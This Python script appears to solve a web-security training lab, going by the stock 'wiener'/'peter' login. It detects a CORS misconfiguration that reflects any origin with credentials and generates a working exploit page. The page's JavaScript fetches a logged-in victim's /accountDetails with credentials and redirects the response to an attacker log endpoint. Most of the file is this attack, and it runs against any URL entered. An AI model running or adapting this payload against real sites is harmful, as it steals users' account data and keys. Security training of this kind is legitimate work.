import requests
from bs4 import BeautifulSoup

def login_and_get_session(base_url, username, password):
    possible_login_paths = ['/login', '/user/login', '/signin', '/account/login']
    session = requests.Session()
    
    # Try different login paths
    for login_path in possible_login_paths:
        login_url = base_url.rstrip('/') + login_path
        login_page = session.get(login_url)
        if login_page.status_code == 200:
            break
    else:
        return None

    soup = BeautifulSoup(login_page.content, 'html.parser')
    login_form = soup.find('form')
    if not login_form:
        return None

    form_data = {input_tag.get('name'): input_tag.get('value', '') for input_tag in login_form.find_all('input') if input_tag.get('name')}

    form_data.update({'username': username, 'password': password})

    headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded'}
    response = session.post(login_url, data=form_data, headers=headers, allow_redirects=True)

    if response.status_code == 200 and 'session' in session.cookies:
        return session
    else:
        return None

def check_cors_vulnerability(session, url, evil_origin):
    headers = {'Origin': evil_origin, 'User-Agent': 'Mozilla/5.0'}
    try:
        response = session.get(url, headers=headers)
        cors_origin = response.headers.get('Access-Control-Allow-Origin')
        cors_credentials = response.headers.get('Access-Control-Allow-Credentials')

        if cors_origin and cors_credentials:
            if cors_origin == evil_origin and cors_credentials == 'true':
                return True
            else:
                return False
        else:
            return False
    except requests.RequestException as e:
        return False

def exploit_cors_vulnerability(lab_url, exploit_server_url):
    exploit_html = f"""
    <script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('get','{lab_url}/accountDetails',true);
        req.withCredentials = true;
        req.send();

        function reqListener() {{
            location='{exploit_server_url}/log?key=' + this.responseText;
        }};
    </script>
    """
    return exploit_html

def check_and_exploit_cors(base_url):
    username = "wiener"
    password = "peter"
    evil_origin = "https://example.com"
    exploit_server_url = "https://exploit-server.net"

    session = login_and_get_session(base_url, username, password)
    results = []

    if session:
        account_details_url = base_url.rstrip('/') + '/accountDetails'
        cors_vulnerable = check_cors_vulnerability(session, account_details_url, evil_origin)
        results.append(f"CORS Vulnerability Check: {'Vulnerable' if cors_vulnerable else 'Not Vulnerable'}")

        if cors_vulnerable:
            exploit_html = exploit_cors_vulnerability(base_url, exploit_server_url)
            results.append("Exploit HTML generated:")
            results.append(exploit_html)
    else:
        results.append("Login failed. Cannot perform further checks.")

    return results

if __name__ == "__main__":
    target_url = input('Enter the URL to test for CORS vulnerability: ')
    results = check_and_exploit_cors(target_url)
    for result in results:
        print(result)
